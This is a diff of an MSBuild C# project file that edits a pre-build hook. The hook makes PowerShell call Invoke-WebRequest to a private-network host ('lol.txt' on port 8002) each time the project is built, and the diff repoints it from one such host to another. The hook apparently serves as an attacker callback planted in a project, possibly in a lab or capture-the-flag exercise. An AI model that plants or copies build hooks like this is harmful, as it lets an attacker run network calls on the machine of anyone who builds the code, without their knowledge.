@@ -81,6 +81,6 @@
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
-    <PreBuildEvent>powershell -command "Invoke-WebRequest -URI 'http://192.168.122.26:8000/lol.txt'"</PreBuildEvent>
+    <PreBuildEvent>powershell -command "Invoke-WebRequest -URI 'http://10.10.14.3:8002/lol.txt'"</PreBuildEvent>
   </PropertyGroup>
 </Project>
